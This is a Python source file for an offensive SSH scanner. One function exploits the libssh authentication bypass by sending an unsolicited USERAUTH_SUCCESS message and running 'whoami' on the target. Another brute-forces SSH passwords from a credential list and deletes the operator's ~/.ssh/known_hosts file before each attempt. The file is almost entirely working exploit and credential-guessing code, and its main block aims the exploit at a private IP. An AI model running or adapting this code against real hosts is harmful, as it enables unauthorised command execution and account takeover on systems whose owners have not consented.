# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-02 22:05
import os

import asyncssh
import paramiko as paramiko
from colorama import Fore
from tqdm import tqdm
import socket
import asyncio


async def checkRce(addr):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        loop = asyncio.get_event_loop()
        await loop.sock_connect(sock, (addr.split(':')[0], int(addr.split(':')[1])))
        message = paramiko.message.Message()
        transport = paramiko.transport.Transport(sock)
        transport.start_client()
        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(message)
        spawncmd = transport.open_session(timeout=6)
        spawncmd.exec_command('whoami')
        if spawncmd.recv_exit_status() == 0:
            tqdm.write(Fore.RED + '[+] Target maybe libssh bypass, {}'.format(addr))
    except Exception:
        pass


async def checkWeakpass(addr, sshUPList):
    for username, password in sshUPList:
        try:
            known_hosts_path = os.path.join(os.path.expanduser('~'), '.ssh', 'known_hosts')
            if os.path.exists(known_hosts_path):
                os.remove(known_hosts_path)
            async with asyncssh.connect(host=addr.split(':')[0], port=int(addr.split(':')[1]), username=username,
                                        password=password, known_hosts=None) as conn:
                tqdm.write(Fore.RED + '[+] target maybe ssh weakpass, {}'.format(
                    str(addr) + ' | ' + str(username) + '/' + str(password)))
                return {'name': 'weakpass', 'url': str(addr) + ' | ' + str(username) + '/' + str(password),
                        'software': 'ssh'}
        except asyncssh.misc.ConnectionLost:
            pass
        except Exception:
            pass


async def sshScan(addr, sshUPList, pbar):
    vulList = []
    a = await checkRce(addr)
    if a is not None:
        vulList.append(a)
    b = await checkWeakpass(addr, sshUPList)
    if b is not None:
        vulList.append(b)
    pbar.update(1)
    return vulList

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(checkRce('192.168.4.137:2222'))
